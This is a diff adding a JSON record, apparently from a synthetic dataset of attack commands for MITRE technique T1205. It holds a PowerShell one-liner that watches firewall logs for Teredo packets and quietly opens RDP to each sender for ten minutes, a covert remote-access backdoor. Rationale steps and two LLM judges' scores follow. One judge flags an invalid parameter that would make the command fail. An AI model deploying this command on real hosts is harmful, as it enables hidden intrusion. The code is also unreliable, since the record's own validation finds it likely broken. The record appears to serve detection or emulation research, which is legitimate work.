@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\\b(ALLOW|DROP)\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+3544\\b') { $src=$matches[2]; $name=\"teredo-rdp-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Treats inbound Teredo (UDP/3544) traffic as a signaling packet to open RDP (3389) for the source IP temporarily.",
+  "rationale_steps": [
+    "Enable firewall logging",
+    "Detect Teredo packets which are uncommon on many enterprise hosts",
+    "Create a scoped, temporary RDP allow rule for the source IP",
+    "Auto-remove the rule after 10 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-6014da4a",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The PowerShell is well-formed with balanced blocks and valid pipelines, but uses an invalid Set-NetFirewallProfile parameter (-LogDropped) that will cause a parameter-binding error.",
+        "semantic_score": 2,
+        "semantic_justification": "While it correctly implements a traffic-signaled trigger consistent with T1205, it is unlikely to achieve the stated behavior due to the invalid -LogDropped parameter, the need for administrative privileges to modify firewall settings, and dependence on WinRM for Invoke-Command to localhost.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T14:57:59.196729Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, braces, valid cmdlet usage, correct parameters, and proper PowerShell syntax throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's logic aligns with Traffic Signaling (T1205) by using network events to trigger actions, it requires administrative privileges to modify firewall rules, directly contradicting the stated 'None' privilege level.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T14:58:17.563718Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 2.5,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
